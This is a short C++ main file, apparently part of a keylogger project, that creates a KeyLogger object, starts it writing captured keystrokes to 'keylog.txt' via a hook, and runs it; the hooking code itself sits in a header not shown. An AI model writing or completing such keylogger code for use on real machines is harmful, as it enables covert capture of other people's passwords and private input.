#include <iostream>
#include "KeyLogger.h"

int main() {
    // KeyLog::KeyLoggerConio logger;
    KeyLog::KeyLogger logger;
    
    if (!logger.start("keylog.txt")) {
        std::cerr << "Error al abrir el archivo de log o establecer el hook." << std::endl;
        return 1;
    }
    logger.run();
    return 0;
}
